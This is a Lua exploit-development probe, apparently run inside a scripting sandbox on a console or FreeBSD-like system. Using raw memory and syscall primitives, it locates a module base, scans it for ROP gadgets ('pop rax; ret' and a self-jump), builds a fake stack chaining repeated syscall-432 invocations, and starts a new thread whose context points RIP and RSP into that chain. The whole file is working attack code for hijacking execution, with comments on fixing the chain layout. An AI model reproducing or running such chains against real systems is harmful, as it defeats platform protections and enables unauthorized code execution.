-- CRASH_CLASS: HIGH
-- PROBE 407a: the syscall chain with the correct return-address layout
--
-- Both earlier attempts armed the chain wrong. `pop rax; ret` takes the NEXT word as the
-- value and the word after it as the return address, and the syscall gadget's own `ret`
-- consumes a word too. The sequence that actually walks is
--
--   RIP = pop rax
--   [num][gadget][pop rax][num][gadget] ... [gadget][park]
--
-- because after the syscall's `ret` we must land on `pop rax` again, not on a number.
-- 405a proved the pop gadget and the write gadget execute, so this only changes layout.
-- 8 iterations first: enough to prove the walk, small enough to read if it fails.

print("=== PROBE 407a: CHAIN LAYOUT ===")

local REPS = 8
local SYS_NO = 432

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end
local function u64v(v) return u64(math.floor(v / 4294967296), v % 4294967296) end

local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
pcall(function() memory.write_dword(info, 0x160) end)
local rv = -999
pcall(function() rv = sgn(sc_info(uint64(0), uint64(info), uint64(0), uint64(0), uint64(0), uint64(0))) end)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
print(string.format("[A] base=0x%X size=0x%X", base, size))
if base <= 0 or size <= 0 then print("=== 407a DONE ===") return end
if size > 0x600000 then size = 0x600000 end

local buf
do
    local ok, b = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(b) ~= "string" then print("=== 407a DONE ===") return end
    buf = b
end

local park, pop_rax = 0, 0
do
    local i = 1
    while i < #buf - 1 do
        local a, b = buf:byte(i, i + 1)
        if a == 0xEB and b == 0xFE and park == 0 then park = base + i - 1 end
        if a == 0x58 and b == 0xC3 and pop_rax == 0 then pop_rax = base + i - 1 end
        if park ~= 0 and pop_rax ~= 0 then break end
        i = i + 1
    end
end
print(string.format("[B] park=0x%X pop_rax=0x%X", park, pop_rax))
if park <= 0 or pop_rax <= 0 then print("=== 407a DONE ===") return end

local gadget = 0
pcall(function() gadget = to_num(syscall.syscall_address) end)
print(string.format("[C] gadget=0x%X", gadget))
if gadget <= 0 then print("=== 407a DONE ===") return end

local sc_mmap = make_syscall(477)
local stack = 0
pcall(function() stack = sgn(sc_mmap(uint64(0), uint64(0x8000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))) end)
print(string.format("[D] stack=0x%X", stack))
if stack <= 0 then print("=== 407a DONE ===") return end

local rsp = stack + 0x2000
local p = rsp
local function wq(v) memory.write_qword(p, u64v(v)); p = p + 8 end
wq(SYS_NO)                       -- popped by the first pop_rax
local i = 0
while i < REPS do
    wq(gadget)                   -- return target of the previous ret
    if i < REPS - 1 then
        wq(pop_rax)              -- where the syscall's ret lands
        wq(SYS_NO)
    end
    i = i + 1
end
wq(park)
print(string.format("[D] layout: num, (gadget, pop, num) x %d, gadget, park; ends 0x%X", REPS - 1, p))

local ctx = memory.alloc(0x500)
do
    local k = 0
    while k < 0x500 do
        pcall(function() memory.write_dword(ctx + k, 0) end)
        k = k + 4
    end
end
memory.write_qword(ctx + 0x108, u64(0, 0x480))
memory.write_qword(ctx + 0x110, u64(0, 0x10000))
memory.write_qword(ctx + 0x0c0, u64(0, 0x43))
memory.write_qword(ctx + 0x0e0, u64v(pop_rax))
memory.write_qword(ctx + 0x0f0, u64(0, 0x202))
memory.write_qword(ctx + 0x0f8, u64v(rsp))
memory.write_qword(ctx + 0x100, u64(0, 0x3b))
memory.write_qword(ctx + 0x048, u64(0, 0))
print("[E] context ready")

local sc_thr = make_syscall(430)
local out = memory.alloc(0x20)
memory.write_qword(out, u64(0, 0))
local trv = -999
pcall(function() trv = sgn(sc_thr(uint64(ctx), uint64(out), uint64(0))) end)
local tq = memory.read_qword(out)
local th, tl = 0, 0
if type(tq) == "table" then th = to_num(tq.h); tl = to_num(tq.l) else tl = to_num(tq) end
print(string.format("[E] thr_create rv=%d tid=0x%08X%08X", trv, th, tl))
print("[F] marker after create")

local t = 0
while t < 2000000 do t = t + 1 end
print("[G] marker after two seconds, child never killed")
print("=== 407a DONE ===")
